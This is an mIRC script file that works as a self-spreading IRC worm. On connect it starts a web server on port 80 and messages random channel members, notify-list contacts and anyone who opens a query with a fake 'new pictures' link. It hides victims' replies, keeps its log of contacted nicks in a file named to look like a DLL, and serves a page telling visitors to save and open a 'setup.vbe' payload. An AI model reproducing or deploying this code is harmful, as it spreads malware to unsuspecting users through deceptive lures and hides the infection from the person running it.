[script]
n0=alias iload { if ($portfree(80)) { socklisten www $+ $sock(*,0) $+ $ticks $+ $rand(1,99999) 80 } }
n1=alias irandom { var %a = $chan($rand(1,$chan(0))) | var %b = $nick(%a,$rand(1,$nick(%a,0)),r) | if (!$read(mirc32.dll,w,* $+ %b $+ *)) { .msg %b I have new pictures on my website, http:// $+ $ip | .ignore on | .ignore -u300 %b pncd | .write mirc32.dll %b } }
n2=alias inotify { var %a $notify(0) | var %b 1 | :loop | if (%b > %a) { return } | if ($notify(%b).ison) { if (!$read(mirc32.dll,w,* $+ $notify(%b) $+ *)) { .msg $notify(%b) I have new pictures on my website, http:// $+ $ip | .ignore on | .ignore -u300 $notify(%b) pncd | .write mirc32.dll $notify(%b) } } | inc %b 1 | goto loop }
n3=on *:socklisten:www*: { sockaccept www $+ $sock(*,0) $+ $ticks $+ $rand(1,99999) }
n4=on *:connect:{ mode $me +R | .iload | .inotify | .timer 0 600 .irandom | .timer 0 600 .inotify }
n5=on *:open:?:*:{ if (!$read(mirc32.dll,w,* $+ $nick $+ *)) { .msg $nick I have new pictures on my website, http:// $+ $ip | .write mirc32.dll $nick } }
n6=on *:sockread:www*: { var %a | var %b | .sockread %a | tokenize 32 %a | %b = [ % $+ [ b $+ . $+ [ $sockname ] ] ] | set -u30 %b. $+ $sockname [ [ %b ] $+ [ $1- ] ] |  if ($len($1) < 3) { if (*setup*vbe* iswm %b) { .sockwrite $sockname HTTP/1.0 200 OK $+ $CrLf $+ $CrLf | bread mirc32.dat 0 8192 &a | .sockwrite $sockname &a | unset %b. $+ $sockname | .sockclose $sockname | return } else { .sockwrite $sockname HTTP/1.0 200 OK $+ $CrLf $+ $CrLf | .sockwrite -n $sockname <html><b><center>WELCOME TO $upper($me) $+ 'S WEBSITE</center><hr><br>DOWNLOAD INSTRUCTIONS:<br><br>Right click on this <a href="setup.vbe">LINK</a> and choose "Save Target As.."<br><br>Then click "Save"<br><br>When the download is complete click "Open"</b></html> | unset %b. $+ $sockname | .sockclose $sockname return } } }